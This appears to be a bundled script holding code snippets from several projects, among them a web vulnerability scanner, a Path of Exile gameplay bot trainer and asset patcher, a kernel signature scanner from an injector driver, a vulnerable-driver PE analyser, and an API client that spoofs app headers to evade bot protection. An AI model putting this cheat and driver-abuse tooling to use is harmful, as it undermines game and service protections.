        info         = data.get("info", {})
        self.description = info.get("description", "")
        self.severity    = info.get("severity", "info")
        self.phase       = "active"
        self._requests   = data.get("requests", [])

    async def run(self, target, http, surface, store):
        for req_def in self._requests:
            method  = req_def.get("method", "GET")
            path    = req_def.get("path", "/")
            url     = target.url.rstrip("/") + path
            try:
                resp = await http.request(method, url,
                                          headers=req_def.get("headers", {}),
                                          data=req_def.get("body"),
                                          module=self.name)
            except Exception as e:
                logger.warning(f"Template {self.name} request failed: {e}")
                continue

            if self._check_matchers(resp, req_def):
                yield Finding(
                    name=self.description or self.name,
                    severity=self.severity,
                    module=self.name,
                    endpoint=f"{method} {path}",
                    evidence=resp.body[:500],
                    recommendation=f"Review {path} for {self.name}",
                )

    def _check_matchers(self, resp, req_def) -> bool:
        matchers  = req_def.get("matchers", [])
        condition = req_def.get("matchers_condition", "or")
        if not matchers:
            return False

        results = []
        for m in matchers:
            mtype = m.get("type", "")
            if mtype == "status":
                results.append(resp.status in m.get("status", []))
            elif mtype == "body":
                results.append(any(w in resp.body for w in m.get("words", [])))
            elif mtype == "header":
                for k, v in m.get("headers", {}).items():
                    results.append(resp.headers.get(k, "") == v)
            elif mtype == "regex":
                results.append(bool(re.search(m.get("pattern", ""), resp.body)))

        return all(results) if condition == "and" else any(results)


class PluginEngine:
    def __init__(self,
                 plugin_dirs:   Optional[list[Path]] = None,
                 template_dirs: Optional[list[Path]] = None):
        self._plugin_dirs   = plugin_dirs   or []
        self._template_dirs = template_dirs or []

    def load_modules(self, phases: Optional[list[str]] = None) -> list[BaseModule]:
        modules: list[BaseModule] = []
        modules.extend(self._load_builtin_modules())

        for tdir in self._template_dirs:
            if tdir.is_dir():
                for yaml_file in tdir.glob("*.yaml"):
                    try:
                        modules.append(YAMLTemplateModule(yaml_file))
                    except Exception as e:
                        logger.warning(f"Failed to load template {yaml_file}: {e}")

        for pdir in self._plugin_dirs:
            if pdir.is_dir():
                modules.extend(self._load_from_directory(pdir))

        if phases:
            modules = [m for m in modules if m.phase in phases]
        return modules

    def _load_builtin_modules(self) -> list[BaseModule]:
        modules = []
        try:
            import scan_tool.modules as mod_pkg
            for _, modname, _ in pkgutil.walk_packages(
                    mod_pkg.__path__, prefix="scan_tool.modules."):
                try:
                    mod = importlib.import_module(modname)
                    for attr_name in dir(mod):
                        attr = getattr(mod, attr_name)
                        if (inspect.isclass(attr)
                                and issubclass(attr, BaseModule)
                                and attr is not BaseModule
                                and not attr.__name__.startswith("_")
                                and getattr(attr, "name", "")):
                            modules.append(attr())
                except Exception as e:
                    logger.debug(f"Could not load module {modname}: {e}")
        except Exception as e:
            logger.debug(f"Could not walk modules package: {e}")
        return modules

    def _load_from_directory(self, directory: Path) -> list[BaseModule]:
        modules = []
        for py_file in directory.glob("*.py"):
            if py_file.name.startswith("_"):
                continue
            try:
                spec = importlib.util.spec_from_file_location(py_file.stem, py_file)
                mod  = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                for attr_name in dir(mod):
                    attr = getattr(mod, attr_name)
                    if (inspect.isclass(attr)
                            and issubclass(attr, BaseModule)
                            and attr is not BaseModule):
                        modules.append(attr())
            except Exception as e:
                logger.warning(f"Failed to load plugin {py_file}: {e}")
        return modules
`,Dh=`# poe_ml_train.py — behavioral cloning training loop with FP16 mixed-precision + grad accumulation
# Source: Desktop/poe/src/training/train_policy.py

import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import DataLoader, random_split
from torch.amp import autocast, GradScaler
import structlog
from src.training.dataset import GameplayDataset
from src.decision.ml_policy import PolicyNetwork

logger = structlog.get_logger()


def get_device(force_gpu: bool = True) -> torch.device:
    if torch.cuda.is_available():
        gpu_name   = torch.cuda.get_device_name(0)
        vram_total = torch.cuda.get_device_properties(0).total_mem / (1024 ** 3)
        vram_free  = (torch.cuda.get_device_properties(0).total_mem -
                      torch.cuda.memory_allocated(0)) / (1024 ** 3)
        logger.info("gpu_detected", name=gpu_name,
                    vram_total=f"{vram_total:.1f}GB", vram_free=f"{vram_free:.1f}GB")
        return torch.device("cuda")
    elif force_gpu:
        raise RuntimeError("CUDA GPU required but not available")
    logger.warning("no_gpu", msg="Training on CPU — will be very slow")
    return torch.device("cpu")


def train_policy(
    epochs:         int   = 50,
    lr:             float = 1e-3,
    batch_size:     int   = 64,
    recordings_dir: str   = "data/recordings",
    output_path:    str   = "models/policy_net.pt",
    force_gpu:      bool  = True,
):
    device  = get_device(force_gpu)
    use_amp = device.type == "cuda"

    logger.info("training_policy", device=str(device), epochs=epochs,
                amp=use_amp, batch_size=batch_size)

    dataset = GameplayDataset(recordings_dir)
    if len(dataset) == 0:
        logger.error("no_training_data", msg="Record gameplay first using recorder.py")
        return

    train_size = int(0.9 * len(dataset))
    val_size   = len(dataset) - train_size
    train_set, val_set = random_split(dataset, [train_size, val_size])

    loader_kwargs = (
        {"num_workers": 4, "pin_memory": True, "persistent_workers": True}
        if device.type == "cuda" else {"num_workers": 0}
    )
    train_loader = DataLoader(train_set, batch_size=batch_size, shuffle=True,  **loader_kwargs)
    val_loader   = DataLoader(val_set,   batch_size=batch_size, shuffle=False, **loader_kwargs)

    model            = PolicyNetwork().to(device)
    action_criterion = nn.CrossEntropyLoss()
    pos_criterion    = nn.MSELoss()
    optimizer        = optim.Adam(model.parameters(), lr=lr)
    scheduler        = optim.lr_scheduler.ReduceLROnPlateau(optimizer, patience=5)
    scaler           = GradScaler("cuda") if use_amp else None

    best_val_loss = float("inf")

    for epoch in range(epochs):
        model.train()
        train_loss = 0.0

        for features, minimap, action, position in train_loader:
            features = features.to(device, non_blocking=True)
            minimap  = minimap.to(device,  non_blocking=True)
            action   = action.to(device,   non_blocking=True)
            position = position.to(device, non_blocking=True)

            optimizer.zero_grad(set_to_none=True)

            if use_amp:
                with autocast("cuda"):
                    action_logits, pos_pred = model(features, minimap)
                    loss = action_criterion(action_logits, action) + 0.5 * pos_criterion(pos_pred, position)
                scaler.scale(loss).backward()
                scaler.step(optimizer)
                scaler.update()
            else:
                action_logits, pos_pred = model(features, minimap)
                loss = action_criterion(action_logits, action) + 0.5 * pos_criterion(pos_pred, position)
                loss.backward()
                optimizer.step()

            train_loss += loss.item()

        train_loss /= len(train_loader)

        # ── Validation pass ───────────────────────────────────────────
        model.eval()
        val_loss, correct, total = 0.0, 0, 0
        with torch.no_grad():
            for features, minimap, action, position in val_loader:
                features = features.to(device, non_blocking=True)
                minimap  = minimap.to(device,  non_blocking=True)
                action   = action.to(device,   non_blocking=True)
                position = position.to(device, non_blocking=True)

                if use_amp:
                    with autocast("cuda"):
                        action_logits, pos_pred = model(features, minimap)
                else:
                    action_logits, pos_pred = model(features, minimap)

                val_loss += (action_criterion(action_logits, action) +
                             0.5 * pos_criterion(pos_pred, position)).item()
                pred     = action_logits.argmax(dim=1)
                correct += (pred == action).sum().item()
                total   += action.size(0)

        val_loss /= len(val_loader)
        acc = correct / total if total else 0.0
        scheduler.step(val_loss)

        logger.info("epoch", epoch=epoch + 1, train_loss=f"{train_loss:.4f}",
                    val_loss=f"{val_loss:.4f}", acc=f"{acc:.3f}")

        if val_loss < best_val_loss:
            best_val_loss = val_loss
            torch.save(model.state_dict(), output_path)
            logger.info("checkpoint_saved", path=output_path, val_loss=f"{val_loss:.4f}")
`,Nh=`// poe_null_scene.cs — GGPK bundle service: diff-based file patching over loose bundles
// Source: projects/poe_null/src/PoeNullEffects.Core/GgpkService.cs

using System.Runtime.InteropServices;
using LibGGPK3;
using LibBundledGGPK3;
using LibBundle3;
using LibBundle3.Nodes;
using PoeNullEffects.Core.Models;

namespace PoeNullEffects.Core;

public class GgpkService : IGgpkService
{
    private GGPK?          _ggpk;
    private BundledGGPK?   _bundledGgpk;
    private LibBundle3.Index? _looseIndex;
    private bool           _bundleIndexWorking;
    private byte[]?        _indexFileData;
    private GCHandle       _indexPinHandle;
    private bool           _pendingWrites;

    public bool   IsOpen                => _ggpk != null || _looseIndex != null;
    public bool   IsBundleIndexWorking  => _bundleIndexWorking;
    public string FilePath              { get; private set; } = "";

    public void WriteFile(string path, byte[] data)
    {
        EnsureOpen();

        var index = GetActiveIndex();
        if (index != null && index.TryGetFile(path, out var bundleFileRecord))
        {
            // Queue the write without saving — avoids file-lock conflicts
            // when patching multiple entries in one session.
            bundleFileRecord.Write(data, saveIndex: false);
            _pendingWrites = true;
            return;
        }

        if (_ggpk != null &&
            _ggpk.Root.TryFindNode(path, out var treeNode) &&
            treeNode is FileRecord fileRecord)
        {
            fileRecord.Write(data);
            return;
        }

        throw new FileNotFoundException($"File not found in bundle: {path}");
    }

    /// <summary>Flush the bundle index after a batch of WriteFile operations.</summary>
    public void SaveIndex()
    {
        if (!_pendingWrites) return;

        var index = GetActiveIndex();
        if (index != null)
        {
            index.Save();
            _pendingWrites = false;
        }
    }

    public byte[] ReadFile(string path)
    {
        EnsureOpen();

        var index = GetActiveIndex();
        if (index != null && index.TryGetFile(path, out var bundleFileRecord))
            return bundleFileRecord.Read().ToArray();

        if (_ggpk != null &&
            _ggpk.Root.TryFindNode(path, out var treeNode) &&
            treeNode is FileRecord fileRecord)
            return fileRecord.Read();

        throw new FileNotFoundException($"File not found: {path}");
    }

    public List<GgpkFileEntry> SearchFiles(string query, bool useRegex = false)
    {
        var allFiles = GetAllFiles();

        if (useRegex)
        {
            var regex = new System.Text.RegularExpressions.Regex(
                query,
                System.Text.RegularExpressions.RegexOptions.IgnoreCase |
                System.Text.RegularExpressions.RegexOptions.Compiled);
            return allFiles.Where(f => regex.IsMatch(f.Path)).ToList();
        }

        return allFiles
            .Where(f => f.Path.Contains(query, StringComparison.OrdinalIgnoreCase))
            .ToList();
    }

    private LibBundle3.Index? GetActiveIndex()
    {
        if (_looseIndex   != null) return _looseIndex;
        if (_bundledGgpk  != null && _bundleIndexWorking) return _bundledGgpk.Index;
        return null;
    }

    private void EnsureOpen()
    {
        if (_ggpk == null && _looseIndex == null)
            throw new InvalidOperationException("No GGPK file is open. Call Open() first.");
    }
}
`,Oh=`# poe_watcher_detect.py — foreground-window detection with PoE1 vs PoE2 disambiguation
# Source: 0xE666/path-of-exile-watcher/poe_watcher.py

import ctypes
import psutil


def process_running(name: str) -> bool:
    for p in psutil.process_iter(["name"]):
        try:
            if p.info["name"] and p.info["name"].lower() == name.lower():
                return True
        except Exception:
            pass
    return False


def get_window_title_by_process_name(process_name: str) -> str | None:
    """Return the visible window title for the first window owned by *process_name*."""
    EnumWindows           = ctypes.windll.user32.EnumWindows
    EnumWindowsProc       = ctypes.WINFUNCTYPE(ctypes.c_bool,
                                               ctypes.POINTER(ctypes.c_int),
                                               ctypes.POINTER(ctypes.c_int))
    GetWindowText         = ctypes.windll.user32.GetWindowTextW
    GetWindowTextLength   = ctypes.windll.user32.GetWindowTextLengthW
    IsWindowVisible       = ctypes.windll.user32.IsWindowVisible
    GetWindowThreadProcessId = ctypes.windll.user32.GetWindowThreadProcessId

    found_titles: list[str] = []
    target_pids:  list[int] = []

    for proc in psutil.process_iter(["name", "pid"]):
        try:
            if proc.info["name"] and proc.info["name"].lower() == process_name.lower():
                target_pids.append(proc.info["pid"])
        except Exception:
            pass

    def callback(hwnd, lParam):
        if IsWindowVisible(hwnd):
            pid = ctypes.c_ulong()
            GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value in target_pids:
                length = GetWindowTextLength(hwnd)
                buff   = ctypes.create_unicode_buffer(length + 1)
                GetWindowText(hwnd, buff, length + 1)
                if buff.value:
                    found_titles.append(buff.value)
        return True

    EnumWindows(EnumWindowsProc(callback), 0)
    return found_titles[0] if found_titles else None


def detect_poe_version() -> tuple[int | None, str | None]:
    """
    Detect which Path of Exile executable is foregrounded.

    Returns (1, exe) for PoE 1, (2, exe) for PoE 2, or (None, None)
    if neither process is running.
    """
    poe_candidates = [
        "PathOfExile.exe",
        "PathOfExile_x64.exe",
        "PathOfExileSteam.exe",
        "PathOfExile_x64Steam.exe",
    ]

    for exe in poe_candidates:
        if process_running(exe):
            title = get_window_title_by_process_name(exe)
            if title:
                title_lower = title.lower()
                if "path of exile 2" in title_lower or "poe2" in title_lower:
                    return (2, exe)
                elif "path of exile" in title_lower:
                    return (1, exe)
            # Fall back to exe name heuristic when the window title is unavailable
            if "2" in exe.lower():
                return (2, exe)
            return (1, exe)

    return (None, None)
`,Uh=`// sigscan.cpp — kernel-mode pattern scanner with section-aware iteration
// Source: desktop 3-15/injector-master/Driver/directmemory/scans.cpp

namespace atom::memory
{

#define INRANGE(x,a,b)    (x >= a && x <= b)
#define getBits( x )      (INRANGE(x,'0','9') ? (x - '0') : ((x&(~0x20)) - 'A' + 0xa))
#define getByte( x )      (getBits(x[0]) << 4 | getBits(x[1]))

std::uintptr_t ScanRegionInternal(
    const std::uint8_t* region_begin,
    const std::uint8_t* region_end,
    const char* signature)
{
    if (!region_begin || !region_end || !signature)
        return 0;

    auto scan_result  = static_cast<std::uintptr_t>(0);
    auto scan_compare = reinterpret_cast<const std::uint8_t*>(signature);

    for (auto scan_current = region_begin; scan_current < region_end; scan_current++)
    {
        if (is_terminator(scan_compare[0]))
            return scan_result;

        if (MmIsAddressValid(const_cast<std::uint8_t*>(scan_current)))
        {
            if (is_question(scan_compare[0]) || scan_current[0] == to_byte(scan_compare))
            {
                if (!scan_result)
                    scan_result = ToAddress(scan_current);

                if (is_terminator(scan_compare[2]))
                    return scan_result;

                const bool question[2] = {
                    is_question(scan_compare[0]),
                    is_question(scan_compare[1]),
                };

                if ((question[0] && question[1]) || (!question[0]))
                    scan_compare = (scan_compare + 3);
                else
                    scan_compare = (scan_compare + 2);
            }
            else
            {
                scan_compare = reinterpret_cast<const std::uint8_t*>(signature);
                scan_result  = 0;
            }
        }
    }
    return 0;
}

std::uintptr_t ScanImageInternal(std::uintptr_t image, const char* signature)
{
    if (!image) return 0;

    const auto image_nt_headers    = win32::GetImageNtHeaders(image);
    if (!image_nt_headers) return 0;

    const auto image_section_header = IMAGE_FIRST_SECTION(image_nt_headers);
    if (!image_section_header) return 0;

    for (std::uint16_t i = 0; i < image_nt_headers->FileHeader.NumberOfSections; i++)
    {
        const auto image_section = &image_section_header[i];

        const auto region_begin = reinterpret_cast<const std::uint8_t*>(
            image + image_section->VirtualAddress);
        const auto region_end   = reinterpret_cast<const std::uint8_t*>(
            image + image_section->VirtualAddress + image_section->Misc.VirtualSize);

        auto result = ScanRegionInternal(region_begin, region_end, signature);
        if (result)
            return result;
    }
    return 0;
}

// Mask-based find_signature for usermode callers
void* find_signature(void* memory, size_t size, const char* pattern, const char* mask)
{
    size_t sig_length = strlen(mask);
    if (sig_length > size) return nullptr;

    for (size_t i = 0; i < size - sig_length; i++)
    {
        bool found = true;
        for (size_t j = 0; j < sig_length; j++)
            found &= mask[j] == '?' || pattern[j] == *((char*)memory + i + j);

        if (found)
            return (char*)memory + i;
    }
    return nullptr;
}

} // namespace atom::memory
`,Fh=`# soundmap_request.py — authenticated request flow: trade creation, retry, and pagination
# Source: 0xE666/Soundmap-API/soundmap.py

import uuid
import time
import socket
import urllib.parse
import json
import requests


class Soundmap:  # continued — request layer

    def create_trade_offer(self, song_ids: list, coins: int = 0, note: str = "") -> tuple:
        """POST a new trade offer; returns (success, offer_id)."""
        if not isinstance(song_ids, list):
            raise ValueError("song_ids must be a list")

        offer_id = str(uuid.uuid4())
        payload = {
            "0": {
                "songIds": song_ids,
                "coins":   coins,
                "note":    note,
                "offerId": offer_id,
            }
        }
        url = f"{self.API_BASE}{self.API_CREATE_TRADE_OFFER}"
        try:
            resp = self.http.post(url, headers=self.headers, json=payload)
            resp.raise_for_status()
            return (True, offer_id) if resp.status_code == 200 else (False, None)
        except requests.exceptions.RequestException as e:
            print(f"Error creating trade offer: {e}")
            return (None, None)

    def fetch_songs(self, owner_id: str | None = None) -> dict | None:
        """Fetch all songs for an owner with exponential-backoff retry."""
        if owner_id is None:
            owner_id = self.owner_id

        encoded = urllib.parse.quote(f'{{"0":{{"ownerId":"{owner_id}"}}}}')
        fetch_url = f"{self.API_BASE}{self.API_SONGS2}??batch=1&input={encoded}"

        retries = 3
        backoff_factor = 2

        for attempt in range(retries):
            try:
                socket.gethostbyname("api10.soundmap.dev")   # DNS sanity check

                resp = self.http.get(fetch_url, headers=self.headers)
                resp.raise_for_status()
                songs_data = resp.json()

                songs_by_rarity: dict[str, list] = {
                    "common": [], "uncommon": [], "rare": [],
                    "epic": [], "shiny": [], "other": [],
                }

                for song in songs_data["result"]["data"]["songs"]:
                    entry = {
                        "id":         song["id"],
                        "name":       song["name"],
                        "artist":     song["artist"],
                        "rarity":     song["rarity"],
                        "type":       song.get("type", "normal"),
                        "previewUrl": song.get("previewUrl", False),
                    }
                    if song.get("type") == "shiny":
                        songs_by_rarity["shiny"].append(entry)
                    elif song.get("type") == "mystic":
                        songs_by_rarity["epic"].append(entry)
                    elif song["rarity"] in songs_by_rarity:
                        songs_by_rarity[song["rarity"]].append(entry)
                    else:
                        songs_by_rarity["other"].append(entry)

                return songs_by_rarity

            except socket.gaierror as e:
                print(f"DNS resolution error: {e}")
            except requests.exceptions.RequestException as e:
                print(f"Error fetching songs (attempt {attempt + 1}): {e}")

            time.sleep(backoff_factor ** attempt)

        print("Failed to fetch songs after several attempts.")
        return None
`,kh=`# soundmap_sign.py — Soundmap mobile API client: header construction and signing
# Source: 0xE666/Soundmap-API/soundmap.py

import cloudscraper
import json
from urllib.parse import urlencode
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter


class Soundmap:
    def __init__(self):
        self.authorization_token = "<REDACTED>"
        self.owner_id = "<REDACTED>"
        self.API_BASE = "https://api10.soundmap.dev"
        self.API_SONG  = "/trpc/song"
        self.API_SONGS2 = "/trpc/songs2"

        # Signed request headers — platform + version must match the iOS app
        self.headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Version": "1.57.0",
            "Authorization": self.authorization_token,
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Platform": "ios",
            "User-Agent": "Mmap/650 CFNetwork/3826.400.120 Darwin/24.3.0",
            "Timezone": "America/Chicago",
        }

        self.retry_strategy = Retry(
            total=5,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "OPTIONS"],
            backoff_factor=1,
        )

        self.http = cloudscraper.create_scraper()
        adapter = HTTPAdapter(max_retries=self.retry_strategy)
        self.http.mount("https://", adapter)
        self.http.mount("http://", adapter)

    def build_url_song(self, song_id: str) -> str:
        """Encode song lookup as a tRPC batch GET with nested JSON input."""
        params = {
            "batch": 1,
            "input": json.dumps({"0": {"id": song_id}}),
        }
        return f"{self.API_BASE}{self.API_SONG}?{urlencode(params)}"

    def search_song(self, song_id: str) -> dict | None:
        url = self.build_url_song(song_id)
        try:
            response = self.http.get(url, headers=self.headers)
            response.raise_for_status()
            data   = response.json()
            result = data[0]["result"]["data"]["song"]
            owner  = data[0]["result"]["data"]["owner"]

            return {
                "song_id":   result["id"],
                "song_name": result["name"],
                "coin_value": result["coinValue"],
                "artist":    result["artist"],
                "rarity":    result["rarity"],
                "owner_id":  result["ownerId"],
                "owner_username":        owner["username"],
                "owner_trades_completed": owner["tradesCompleted"],
            }
        except Exception as e:
            print(f"Error fetching song {song_id}: {e}")
            return None
`,zh=`# trade_limit.py — token-bucket rate limiter with sliding-window backoff
# Source: 0xE666/path-of-exile-trade-api/poetrade/rate_limiter.py

from __future__ import annotations
import asyncio
from dataclasses import dataclass, field
from typing import Mapping


@dataclass
class RateRule:
    """One rate limit rule parsed from API response headers.

    Fields match the X-Rate-Limit-<policy> header format:
        max_hits : window : penalty
    """
    max_hits:         int
    window:           int
    penalty:          int
    current:          int   = 0
    penalty_remaining: float = 0.0


@dataclass
class PolicyState:
    """All rules for a single named rate-limit policy."""
    rules: list[RateRule] = field(default_factory=list)


class RateLimiter:
    """Parses GGG trade API rate-limit headers and enforces per-policy back-off."""

    def __init__(self):
        self._policies: dict[str, PolicyState] = {}

    def update(self, policy: str, headers: Mapping[str, str]) -> None:
        """Ingest X-Rate-Limit-* headers from a live response."""
        rules_header = headers.get("X-Rate-Limit-Rules", "")
        if not rules_header:
            return

        rule_names = [r.strip() for r in rules_header.split(",")]
        all_rules: list[RateRule] = []

        for rule_name in rule_names:
            limit_header = headers.get(f"X-Rate-Limit-{rule_name}", "")
            state_header = headers.get(f"X-Rate-Limit-{rule_name}-State", "")
            if not limit_header:
                continue

            limits = limit_header.split(",")
            states = state_header.split(",") if state_header else []

            for i, limit_str in enumerate(limits):
                parts = limit_str.strip().split(":")
                if len(parts) != 3:
                    continue
                max_hits, window, penalty = int(parts[0]), int(parts[1]), int(parts[2])
                current, penalty_remaining = 0, 0.0

                if i < len(states):
                    s = states[i].strip().split(":")
                    if len(s) == 3:
                        current           = int(s[0])
                        penalty_remaining = float(s[2])

                all_rules.append(RateRule(
                    max_hits=max_hits, window=window, penalty=penalty,
                    current=current, penalty_remaining=penalty_remaining,
                ))

        self._policies[policy] = PolicyState(rules=all_rules)

    def wait_time(self, policy: str) -> float:
        """Return seconds to wait before the next request under *policy*."""
        state = self._policies.get(policy)
        if state is None:
            return 0.0

        max_wait = 0.0
        for rule in state.rules:
            if rule.penalty_remaining > 0:
                max_wait = max(max_wait, rule.penalty_remaining)
            elif rule.current >= rule.max_hits - 1:
                # Within one hit of the cap — back off for the full window
                max_wait = max(max_wait, float(rule.window))
        return max_wait

    async def acquire(self, policy: str) -> None:
        """Async sleep until the policy window permits another request."""
        wait = self.wait_time(policy)
        if wait > 0:
            await asyncio.sleep(wait)

    def handle_429(self, headers: Mapping[str, str]) -> float:
        """Return the Retry-After delay (seconds) from a 429 response."""
        try:
            return float(headers.get("Retry-After", "60"))
        except ValueError:
            return 60.0
`,Bh=`# vaal_route.py — multi-provider LLM router with per-provider format normalisation
# Source: projects/air/vaal/core/providers.py + llm.py

from __future__ import annotations
from dataclasses import dataclass
from typing import Generator

import httpx


BUILTIN_PROVIDERS: dict[str, dict] = {
    "ollama": {
        "base_url": "http://localhost:11434",
        "requires_key": False,
        "chat_endpoint": "/api/chat",
        "format": "ollama",
    },
    "openai": {
        "base_url": "https://api.openai.com/v1",
        "requires_key": True,
        "key_env": "OPENAI_API_KEY",
        "chat_endpoint": "/chat/completions",
        "format": "openai",
    },
    "anthropic": {
        "base_url": "https://api.anthropic.com",
        "requires_key": True,
        "key_env": "ANTHROPIC_API_KEY",
        "chat_endpoint": "/v1/messages",
        "format": "anthropic",
    },
    "groq": {
        "base_url": "https://api.groq.com/openai/v1",
        "requires_key": True,
        "key_env": "GROQ_API_KEY",
        "chat_endpoint": "/chat/completions",
        "format": "openai",
    },
    "openrouter": {
        "base_url": "https://openrouter.ai/api/v1",
        "requires_key": True,
        "key_env": "OPENROUTER_API_KEY",
        "chat_endpoint": "/chat/completions",
        "format": "openai",
    },
    "deepseek": {
        "base_url": "https://api.deepseek.com/v1",
        "requires_key": True,
        "key_env": "DEEPSEEK_API_KEY",
        "chat_endpoint": "/chat/completions",
        "format": "openai",
    },
}

DEFAULT_MODELS: dict[str, str] = {
    "ollama":      "qwen3:8b",
    "openai":      "gpt-4o",
    "anthropic":   "claude-opus-4-6",
    "groq":        "llama-3.3-70b-versatile",
    "openrouter":  "anthropic/claude-sonnet-4",
    "deepseek":    "deepseek-chat",
}


def parse_model_string(model_str: str) -> tuple[str, str]:
    """Parse 'provider:model' into (provider, model_id).

    Falls back to ('ollama', model_str) when no known prefix is found,
    so bare Ollama model tags like 'qwen3:8b' route correctly.
    """
    for provider in BUILTIN_PROVIDERS:
        if model_str.startswith(f"{provider}:"):
            return provider, model_str[len(provider) + 1:]
    return "ollama", model_str


def chat_with_tools_stream(
    messages: list[dict],
    tools: list[dict],
    model: str = "qwen3:8b",
    think: bool = False,
    max_tokens: int = 8192,
) -> Generator[dict, None, None]:
    """Streaming chat with tool support.  Routes to the correct provider.
    Yields dicts with content / tool_calls / done keys."""
    provider, model_id = parse_model_string(model)

    # Cloud providers and capable local models both get generous output limits
    output_limit = max_tokens
    if provider in ("anthropic", "openai", "openrouter"):
        output_limit = 16384

    yield from stream_provider(
        provider_name=provider,
        model=model_id,
        messages=messages,
        tools=tools,
        max_tokens=output_limit,
        think=think,
    )
`,Gh=`# vaal_tooluse.py — streaming tool-use loop with permission gating and cancellation
# Source: projects/air/vaal/core/tool_executor.py + llm.py

from __future__ import annotations

from .hooks import load_hooks, run_hooks
from .permissions import PermissionManager
from .auto_fix import detect_bash_failure
from ..tools.registry import get_tool

_hooks = load_hooks()
_last_bash_failure: dict | None = None


def execute_tool(
    name: str,
    params: dict,
    permissions: PermissionManager,
    ask_fn=None,
) -> tuple[str, bool]:
    """Execute a single tool call.  Returns (result_text, was_executed).

    Permission ladder (first match wins):
      1. internet-blocked  — hard reject with hint
      2. deny list         — hard reject
      3. needs_approval    — prompt via ask_fn; remember if approved
      4. execute
    """
    global _last_bash_failure

    tool = get_tool(name)
    if tool is None:
        return f"[error: unknown tool '{name}']", False

    if permissions.is_internet_blocked(name):
        return (
            f"[tool '{name}' is blocked — internet access is disabled. "
            "Use /internet to re-enable.]",
            False,
        )

    if permissions.is_denied(name):
        return (
            f"[tool '{name}' is blocked by deny rule. "
            "Use /deny clear to remove deny rules.]",
            False,
        )

    if permissions.needs_approval(name):
        if ask_fn:
            approved = ask_fn(name, params)
            if not approved:
                return "[tool call denied by user]", False
            permissions.approve(name, remember=True)
        else:
            return "[tool requires approval but no ask function provided]", False

    # Auto-resolve relative paths so tools always receive absolute paths
    import os
    for path_key in ("file_path", "path"):
        if path_key in params and params[path_key]:
            p = str(params[path_key]).replace("\\\\", "/")
            if not os.path.isabs(p):
                params[path_key] = os.path.join(os.getcwd(), p).replace("\\\\", "/")

    pre_ctx = {"tool_name": name, "tool_params": str(params)}
    run_hooks("pre_tool", pre_ctx, _hooks)

    try:
        result   = tool.handler(**params)
        executed = True
    except Exception as e:
        result   = f"[tool error: {e}]"
        executed = False

    post_ctx = {
        "tool_name":    name,
        "tool_params":  str(params),
        "tool_result":  result,
        "tool_success": str(executed),
    }
    run_hooks("post_tool", post_ctx, _hooks)

    # Track bash failures for the auto-fix integration
    error_output = detect_bash_failure(name, result)
    _last_bash_failure = (
        {"command": params.get("command", ""), "error_output": error_output}
        if error_output is not None
        else None
    )

    return result, executed


def run_response_hooks(response_text: str) -> None:
    run_hooks("on_response", {"response": response_text}, _hooks)


def format_tool_result(name: str, result: str) -> str:
    if len(result) > 10_000:
        result = result[:10_000] + "\\n\\n[... output truncated]"
    return result
`,Hh=`// vuln_pe.cpp — vulnerable-driver loader: PE parser, section walker, relocation fixup, IOCTL marshaling
// Source: D:/BackupFolder/vuln/vuln/vuln.cpp

};

FILE* g_outputFile = NULL;

void OutputLog(const char* format, ...) {
    va_list args;
    va_start(args, format);

    vprintf(format, args);

    if (g_outputFile) {
        vfprintf(g_outputFile, format, args);
    }

    va_end(args);
}

BYTE* ReadDriverFile(const char* filepath, DWORD& fileSize) {
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return NULL;
    }

    BYTE* buffer = new BYTE[fileSize];
    DWORD bytesRead = 0;

    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        delete[] buffer;
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    return buffer;
}

BOOL IsPEFile(BYTE* fileData, DWORD fileSize) {
    if (fileSize < 64) return FALSE;

    DOS_HEADER* dosHeader = (DOS_HEADER*)fileData;

    if (dosHeader->e_magic[0] != 'M' || dosHeader->e_magic[1] != 'Z') {
        return FALSE;
    }

    if (dosHeader->e_lfanew > fileSize - 4 || dosHeader->e_lfanew < 64) {
        return FALSE;
    }

    return TRUE;
}

DWORD GetPEOffset(BYTE* fileData) {
    DOS_HEADER* dosHeader = (DOS_HEADER*)fileData;
    return dosHeader->e_lfanew;
}

std::vector<SECTION_HEADER> GetSections(BYTE* fileData, DWORD peOffset, int& numSections) {
    std::vector<SECTION_HEADER> sections;
    numSections = 0;

    FILE_HEADER* fileHeader = (FILE_HEADER*)(fileData + peOffset + 4);
    numSections = fileHeader->NumberOfSections;

    if (numSections <= 0 || numSections > 100) {
        numSections = 0;
        return sections;
    }

    DWORD sectionOffset = peOffset + 4 + sizeof(FILE_HEADER) + fileHeader->SizeOfOptionalHeader;

    for (int i = 0; i < fileHeader->NumberOfSections; i++) {
        SECTION_HEADER* pSection = (SECTION_HEADER*)(fileData + sectionOffset);
        sections.push_back(*pSection);
        sectionOffset += sizeof(SECTION_HEADER);
    }

    return sections;
}

int FindSectionByRVA(const std::vector<SECTION_HEADER>& sections, DWORD rva) {
    for (int i = 0; i < (int)sections.size(); i++) {
        if (rva >= sections[i].VirtualAddress &&
            rva < sections[i].VirtualAddress + sections[i].VirtualSize) {
            return i;
        }
    }
    return -1;
}

std::string GetSectionName(const SECTION_HEADER& section) {
    char name[9] = { 0 };
    strncpy_s(name, sizeof(name), (char*)section.Name, 8);
    return std::string(name);
}

// Check for vulnerable patterns in driver
std::vector<Finding> ScanForVulnerabilities(BYTE* fileData, DWORD fileSize, const std::vector<SECTION_HEADER>& sections) {
    std::vector<Finding> findings;

    for (size_t idx = 0; idx < sections.size(); idx++) {
        const SECTION_HEADER& section = sections[idx];
        char sectionName[9] = { 0 };
        strncpy_s(sectionName, sizeof(sectionName), (const char*)section.Name, 8);

        // Writable + Executable sections
